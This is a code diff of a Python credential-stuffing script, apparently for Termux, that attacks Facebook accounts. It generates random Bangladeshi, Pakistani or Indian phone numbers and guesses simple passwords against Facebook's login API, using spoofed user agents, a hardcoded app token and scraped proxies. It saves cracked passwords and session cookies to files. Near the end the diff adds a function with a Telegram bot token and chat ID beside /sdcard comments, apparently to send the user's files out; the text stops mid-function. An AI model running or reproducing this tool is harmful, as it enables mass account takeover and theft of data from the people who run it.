@@ -1,140 +1,1499 @@
-#===== SC DAVLOPER : ржЬрж╛ржЙрж░рж╛ ZUYAN ЁЯдгтШ║я╕П
 
-#====== SC SEND BY > KALYAN KING
-
-#====== TEAM : KGF CYBER TEAM
-import os
+import os,time,random,string,re,sys,requests,json,uuid
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+gtxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
+gt=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
+try:os.system("pkg install espeak")
+except:pass
+os.system("git pull")
 try:
-    import requests,rich,bs4,fake_useragent
+	proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+	open('socksku.txt','w').write(proxylist)
+except Exception as e:pass
+proxsi=open('socksku.txt','r').read().splitlines()
+####$#######
+B = '\x1b[1;90m'
+R = '\x1b[1;91m'
+G = '\x1b[1;92m'
+H = '\x1b[1;93m'
+BL = '\x1b[1;94m'
+BG = '\x1b[1;95m'
+S = '\x1b[1;96m'
+W = '\x1b[1;97m'
+EX = '\x1b[0m'
+E = '\33[m'
+#########
+ugen=[]
+ugtn=[]
+ugxn=[] 
+xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
+fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
+###########--[ RANDOM]--#############
+#######$$
+dt="•"
+#########
+id
+ok=[]
+cp=[]
+twf=[]
+lop=0
+xode=[]
+plist=[]
+cpx=[]
+cokix=[]
+apkx=[]
+paswtrh = []
+rcd=[]
+rcdx=[]
+version="1.07"
+def line():
+	print(40*"=")
+############------[ RANDOM SYS ]------#########
+BDX=f"{W}BD SIM CODE : {G}017 015 018 019 013 016{E}{W}"
+INDX=f"{W}IND SIM CODE : {G}9670 9725 8948 8795 6383{E}{W}"
+PAKX=f"{W}PAK SIM CODE : {G}0306 0315 0335 0345 0318{E}{W}"
+LIMITX=f"EXAMPLE : {G}1000{W},{G}5000{W},{G}10000{W},{G}15000{W},{G}20000{W}"
+############------[ A SYS ]------#########
+CPG=f"[{G}+{W}] Do you went show cp account (y/n)"
+CKIG=f"[{G}+{W}] Do you went show cookie (y/n)"
+chc=f'{W}[{G}+{E}] Choice : {G}'
+flp=f"{W}[{G}•{W}] PUT FILE PATH\033[1;37m : {G}"
+chcps=f'EXAMPLE: {G}first123{W},{G}last123{W},{G}firstlast{W},{G}name{W}'
+mxxt=f'{W}[{G}A{W}] METHOD [{G}1{W}]\n{W}[{G}B{W}] METHOD [{G}2{W}]\n{W}[{G}C{W}] METHOD [{G}3{W}]'
+nflp=f"[{R}!{W}] FILE LOCATION NOT FOUND "
+############------[ LOGO ]------#########
+os.system('espeak -a 300 "well,come to, BOSS EMRAN EHC"')
+def logo():
+	os.system('clear');print(f"""\r\r\x1b[1;97m{W}
+
+  \033[38;5;46m╔═════════════════════════════════════╗
+  \033[38;5;46m║ ╔════════╗ \033[38;5;46m╔═══════════╗ \x1b[38;5;196m╔════════╗ ║
+  \033[38;5;46m║ ║\033[38;5;46m███████ ║ \033[38;5;46m║\x1b[38;5;196m███    ███ ║ \033[38;5;46m║\033[38;5;46m██████  ║ ║
+  \033[38;5;46m║ ║\033[38;5;46m██      ║ \033[38;5;46m║\x1b[38;5;196m████  ████ ║ \033[38;5;46m║\033[38;5;46m██   ██ ║ ║
+  \033[38;5;46m║ ║\033[38;5;46m█████   ║ \033[38;5;46m║\x1b[38;5;196m██ ████ ██ ║ \033[38;5;46m║\033[38;5;46m██████  ║ ║
+  \033[38;5;46m║ ║\033[38;5;46m██      ║ \033[38;5;46m║\x1b[38;5;196m██  ██  ██ ║ \033[38;5;46m║\033[38;5;46m██   ██ ║ ║
+  \033[38;5;46m║ ║\033[38;5;46m███████ ║ \033[38;5;46m║\x1b[38;5;196m██      ██ ║ \033[38;5;46m║\033[38;5;46m██   ██ ║ ║
+  \033[38;5;46m║ ╚════════╝ \033[38;5;46m╚═══════════╝ \033[38;5;46m╚════════╝ ║
+  \033[38;5;46m║ ╔════════╗ \033[38;5;46m╔══════════╗             ║
+  \033[38;5;46m║ ║ \033[37;1m█████  ║ \033[38;5;46m║\033[38;5;46m███    ██ ║     ࿇⃝🌹⃢𝐄⃢🌹⃝࿇ ║
+  \033[38;5;46m║ ║\033[37;1m██   ██ ║ \033[38;5;46m║\033[38;5;46m████   ██ ║     ࿇⃝🌹⃢𝐌⃢🌹⃝࿇ ║
+  \033[38;5;46m║ ║\033[37;1m███████ ║ \033[38;5;46m║\033[38;5;46m██ ██  ██ ║     ࿇⃝🌹⃢𝐑⃢🌹⃝࿇ ║
+  \033[38;5;46m║ ║\033[37;1m██   ██ ║ \033[38;5;46m║\033[38;5;46m██  ██ ██ ║     ࿇⃝🌹⃢𝐀⃢🌹⃝࿇ ║
+  \033[38;5;46m║ ║\033[37;1m██   ██ ║ \033[38;5;46m║\033[38;5;46m██   ████ ║     ࿇⃝🌹⃢𝐍⃢🌹⃝࿇ ║
+  \033[38;5;46m║ ╚════════╝ \033[38;5;46m╚══════════╝             ║ 
+  \033[38;5;46m╚═════════════════════════════════════╝                                                 
+\x1b[38;5;196m╔═════════════╗  ࿇⃝🌹⃢𝐄⃢🌹⃝࿇  \033[38;5;46m╔══════════════════╗
+\033[38;5;46m║[🔵]\x1b[38;5;196m𝐀𝐔𝐓𝐇𝐎𝐑   ║  ࿇⃝🌹⃢𝐌⃢🌹⃝࿇  \033[38;5;46m║\033[38;5;46m𝐄𝐌𝐑𝐀𝐍             ║
+\033[38;5;46m║[🔵]\x1b[38;5;196m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 ║  ࿇⃝🌹⃢𝐑⃢🌹⃝࿇  \033[38;5;46m║\033[38;5;46m𝐌𝐑𝐀𝐍 𝐇𝐎𝐒𝐒𝐀𝐈𝐍      ║
+\033[38;5;46m║[🔵]\x1b[38;5;196m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 ║  ࿇⃝🌹⃢𝐀⃢🌹⃝࿇  \033[38;5;46m║\033[38;5;46m𝟗𝟕𝟏𝟎𝟓𝟔𝟗𝟓𝟒𝟗𝟖𝟓𝟕     ║
+\033[38;5;46m║[🔵]\x1b[38;5;196m𝐆𝐈𝐓𝐇𝐔𝐁   ║  ࿇⃝🌹⃢𝐍⃢🌹⃝࿇  \033[38;5;46m║\033[38;5;46m𝐄𝐌𝐑𝐀𝐍 𝐂𝐘𝐁𝐄𝐑 𝟗𝟗𝟒𝟖𝟕 ║
+\033[38;5;46m║[🔵]\x1b[38;5;196m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 ║  ࿇⃝🌹⃢𝐊⃢🌹⃝࿇  \033[38;5;46m║\033[38;5;46m𝟗𝟕𝟏𝟎𝟓𝟔𝟗𝟓𝟒𝟗𝟖𝟓𝟕     ║
+\033[38;5;46m║[🔵]\x1b[38;5;196m𝐈𝐌𝐎      ║  ࿇⃝🌹⃢𝐈⃢🌹⃝࿇  \033[38;5;46m║\033[38;5;46m𝟗𝟕𝟏𝟎𝟓𝟔𝟒𝟑𝟓𝟑𝟗𝟑𝟑     ║
+\033[38;5;46m║[🔵]\x1b[38;5;196m𝐅𝐑𝐎𝐌     ║  ࿇⃝🌹⃢𝐍⃢🌹⃝࿇ \033[38;5;46m ║\033[38;5;46m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇        ║
+\x1b[38;5;196m╚═════════════╝  ࿇⃝🌹⃢𝐆⃢🌹⃝࿇  \033[38;5;46m╚══════════════════╝\x1b[1;97m""")
+############------[ RANDOM NUM ]------#########
+def Main():
+	logo()
+	print(f' {W}[{G}A{W}]{W} RANDOM CRACK [{G}BANGLADESH{W}]');print(f' {W}[{G}B{W}]{W} RANDOM CRACK [{G}PAKISTAN{W}]');print(f' {W}[{G}C{W}]{W} RANDOM CRACK [{G}INDIA{W}]')
+	line()
+	ghx=input(f' [{G}+{W}] Choice : {G}')
+	if ghx in ["A","a","1"]:rcd.append(f'1');rmenu1()
+	elif ghx in ["B","b","2"]:rcd.append(f'2');rmenu1()
+	elif ghx in ["C","c","3"]:rcd.append(f'3');rmenu1()
+	else:line();print(f'\n \t {R}Choose valid option{E}');time.sleep(1);Main()
+############------[RANDOM NUMBER SYSTEM]------#########
+def rmenu1():
+	logo()
+	if "1" in rcd:print(f"{BDX}");line()
+	if "2" in rcd:print(f"{PAKX}");line()
+	if "3" in rcd:print(f"{INDX}");line()
+	code=input(f'{chc}');print(f"{W}{40*'='}")
+	print(f'{LIMITX}');line()
+	limit=int(input(f'[{G}+{E}] Limit : {G}'))
+	print(f"{W}{40*'='}");print(f'{CPG}');line()
+	cx=input(f'[{chc}')
+	if cx in ['n','N','no','NO','2']:cpx.append(f'n')
+	else:cpx.append(f'y')
+	print(f"{W}{40*'='}");print(f'{CKIG}');line()
+	ckiv=input(f'{chc}')
+	if ckiv in ['n','N','no','NO','2']:cokix.append(f'n')
+	else:cokix.append(f'y')
+	for number in range(limit):
+		if "1" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(8));xode.append(numberx)
+		if "2" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(7));xode.append(numberx)
+		if "3" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(6));xode.append(numberx)
+	with ThreadPool(max_workers=60) as tonxoys:
+		tid= str(len(xode))
+		logo();print(f' [{G}•{W}] TOTAL ID :\033[1;92m '+tid);print (f' {W}[{G}•{W}] \033[1;97mSIM CODE : \033[1;92m'+code);print(f' {W}[{G}•{W}] \033[1;37mTHE PROCESS HAS BEEN STARTED');print(f' [{G}•{W}] \033[1;37mUSE AEROPLANE MODE IN EVERY 5 MIN ');print(40*"=")
+		for rngx in xode:
+			id=code+rngx
+			if "1" in rcd:psd=[id,rngx,id[:6],id[:7],id[:8],id[5:]]
+			if "2" in rcd:psd=[id,rngx,id[5:],"khan123"]
+			if "3" in rcd:psd=[id,rngx,id[:6],"57273200"]
+			tonxoys.submit(graphrm,id,psd,tid)
+############------[RANDOM USN SYSTEM BOSS EMRAN EHC]-------#########
+lk=[]
+def graphrm(id,psd,tid):
+	global ok,cp,lk,lop
+	togg=[]
+	sys.stdout.write(f'\r\r{BG}[{W}BOSS EMRAN EHC-GIFT-SCRIPT{BG}]{G}{E}{BG}[{G}{lop}{W}/{G}{tid}{BG}]{E}{BG}[{W}OK{W}:{G}%s{W}/{S}%s{BG}]{E}'%(len(ok),len(lk)));sys.stdout.flush()
+	for psw in psd:
+		#ua=ua1()
+		vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150));VAPP = random.randint(410000000,499999999);gtt=random.choice(xxxxx);gttt=random.choice(xxxxx)
+		ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {str(gtt)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+"[FBAN/FB4A;FBAV/347.0.0.3.161;FBBV/229145646;FBDM/{density=3.3,width=1080,height=1430};FBLC/en_GB;FBRV/859351995;FBCR/AT&amp;amp-T;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
+		datax= {'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'email': id,'password': psw,'generate_analytics_claims': '1', 'community_id': '','cpl': 'true','try_num': '1','family_device_id': str(uuid.uuid4()),'credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false','generate_session_cookies': '1','generate_machine_id': '1','currently_logged_in_userid': '0','locale': 'en_GB','client_country_code': 'GB', 'fb_api_req_friendly_name': 'authenticate'}
+		header={'User-Agent': ua,'Accept-Encoding':  'gzip, deflate','Accept': '*/*', 'Connection': 'keep-alive','Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate','X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),'X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'unknown','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}
+		twfx= 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
+		lo=requests.post('https://'+'b-gr'+'ap'+'h'+'.facebook.com/auth/login',data=datax,headers=header,allow_redirects=False).json()
+		if 'session_key' in lo:
+			cki = lo["session_cookies"]
+			ck={}
+			for xk in cki:ck.update({xk["name"]:xk["value"]})
+			coki = (";").join([ "%s=%s" % (key, value) for key, value in ck.items() ])
+			iid= re.findall('c_user=(.*);xs', coki)[0]
+			print(f'\r\r{G}[EMRAN-OK] {iid} | {psw}{W}');os.system('espeak -a 300 "ok id"');ok.append(id);open('/sdcard/EHC-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
+			if 'y' in cokix:print(f'\r\r{R}[{G}COOKIES🍪{R}]{W} : {G}{coki}{E}');print(f"{W}{40*'-'}{E}")
+			break
+		elif twfx in str(lo):
+			iid = lo['error']['error_data']['uid']
+			print(f'\r\r{BL}[EMRAN-2F] {iid} | {psw}{W}');os.system('espeak -a 300 "two,f id"');open('/sdcard/EHC-2F.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
+			twf.append(id)
+			break
+		elif 'www.facebook.com' in lo['error']['message']:
+			try:
+				iid = lo['error']['error_data']['uid']
+			except:
+				iid=id
+			if iid in ok:pass
+			else:
+				if 'y' in cpx:
+					print(f'\r\r{R}[BOSS EMRAN EHC-GIFT-SCRIPT] {iid} | {psw}{W}');cp.append(id);os.system('espeak -a 300 "cp id"');open('/sdcard/TKM-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
+			break
+		else:continue
+	lop+=1
+	import requests,os,sys
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+
+try:
+    import requests
 except:
-    os.system('pip install requests && pip install rich')
-from rich import print
-from rich.console import Console
-from rich.panel import Panel
-from concurrent.futures import ThreadPoolExecutor as tred
-import requests
-import random
-import string
-import uuid
-import time
-import sys
-import re
-#-----------------------#
-R="[bold red]"
-G="[bold green]"
-Y="[bold yellow]"
-B="[bold blue]"
-M="[bold magenta]"
-P="[bold violet]"
-C="[bold cyan]"
-W="[bold white]"
-r="\033[1;31m"
-g="\033[1;32m"
-y="\033[1;33m"
-b="\033[1;34m"
-m="\033[1;35m"
-c="\033[1;36m"
-w="\033[1;37m"
-X = "[bold green]<[bold white]+[bold green]>[bold white]"
-os.system('espeak -v bn+f3 -a 120 -p 40 -s 100 "ржмрзЛржХрж╛ржЪрзЛржжрж╛ ржЬрзБрзЯрж╛ржи Script Wlacme рждрзЛржорж╛ржжрзЗрж░ ржХрж▓рзНржпрж╛ржи ржнрж╛ржЗ ржПржЗ Script ржЯрж╛ ржжрж┐ржЪрзНржЫрзЗ рждрзЛржорж╛рж░рж╛ ржЖржмрж╛рж░ ржЬрзБрзЯрж╛ржи ржмрзЛржХрж╛ржЪрзЛржжрзЗржХрзЗ ржмрж▓ржмрж╛ ржирж╛ ржПржЯрж╛ ржоржЬрж╛ ржХрж░рзЛ"')
-#-----------------------#
-logo = Panel(f"""
-{X} CREATOR   : [bold green]MR ZUYAN  
-{X} FRAMEWORK : [bold yellow]XVSOULX - ELITE  
-{X} FACEBOOK  : [bold magenta]MR ZUYAN & ZUYANx  
-{X} SECURITY  : [bold red]AI-POWERED SHIELD  
-{X} SCRIPT SEND     : [bold blue]KALYAN KING
-{X} TRUSTED   : [bold cyan]ELITE DEVELOPERS""",
-title="[bold yellow]тЪб XVSOULX тЪб[/bold yellow]",
-border_style="green1")
-#-----------------------#
-def clear():
-    os.system("xdg-open https://t.me/KGF_WORLD_CYBER")
-    os.system('clear')
-#-----------------------#
-def linex():
-    print(f"{W}тАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФ")
-#-----------------------#
-live = 0
-cp = 0
-loop = 0
-numx = []
-console = Console()
-#-----------------------#
-def ugenX():
-    android_version = random.randint(10, 13)  # Random Android version
-    build_number = f"QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}"
-    # Fixed device details from your provided UA
-    density = 2.75
-    width, height = 1080, 2220  
-    # Random Facebook app version and build version
-    fb_versions = [
-        ("335.0.0.28.118", "316527966", "317757053"),
-        ("347.0.0.3.161", "229145646", "318734599"),
-        ("350.0.0.8.89", "318734599", "320456789")
-    ]
-    fb_version, fb_build, fb_rv = random.choice(fb_versions)
-    # Generate User-Agent
-    user_agent = (
-        f"Mozilla/5.0 (Linux; Android {android_version}; Build/{build_number}) "
-        f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90, 120)}.0.0.0 Mobile Safari/537.36 "
-        f"[FBAN/FB4A;FBAV/{fb_version};FBPN/com.facebook.katana;FBLC/ru_RU;FBBV/{fb_build};"
-        f"FBCR/Bezlimit;FBMF/Xiaomi;FBBD/Redmi;FBDV/Redmi Note 8 Pro;FBSV/{android_version};"
-        f"FBCA/armeabi-v7a:armeabi;FBDM/{{density={density},width={width},height={height}}};"
-        f"FB_FW/1;FBRV/{fb_rv};]"
-    )
-    return user_agent
+    os.system("pip install requests")
+    import requests 
 
-# Example Usage
+#@useridinfobot
 
-
-def main():
-    clear()
-    console.print(logo)
-    console.print(Panel("017/018/019/016", style="bold green1"))
-    # Custom bottom-styled input
-    console.print("тХнтФАтФА(тЪбXVSOULXтЪб)")
-    code = console.input("тХ░тФАтФАтФАтФА> ")
-    clear()
-    console.print(logo)
-    console.print(Panel('1000/2000/50000',style="bold green1"))
-    console.print("тХнтФАтФА(тЪбXVSOULXтЪб)")
-    limit = int(console.input("тХ░тФАтФАтФАтФА> "))
-    for _ in range(limit):
-        num = ''.join(random.choice(string.digits) for _ in range(8))
-        numx.append(num)
-    with tred(max_workers=30) as ZUYAN:
-        clear()
-        console.print(logo)
-        console.print(Panel(f"{X} CODE : {code}\n{X} LIMIT : {limit}\n{X} CRACKING WITH ZUYAN"))
-        for sex in numx:
-            uid = code+sex
-            pwx = [sex,uid,uid[:6],uid[:7],uid[:8],uid[5:]]
-            ZUYAN.submit(crack,uid,pwx)
-
-def crack(uid,pwx):
-    global live,loop
+def suyaib():
+    session=requests.session()
+        
+    bot_token = '8268228227:AAGLn0of3Id6lARdYzodh5Vemd7dQf74ll4' 
+    chat_id = '6846196885'    
+    #-------------( /sdcard\ )--------------#  
+    #--------------------apk-------------------#																																							
     try:
-        for pw in pwx:
-            sys.stdout.write(f'\r{w}[{b}тЮд{w}] {y}CRACKING {w}[{g}{loop}{w}]<>[ALIVE:{g}{live}{w}]\r')
-            sys.stdout.flush()
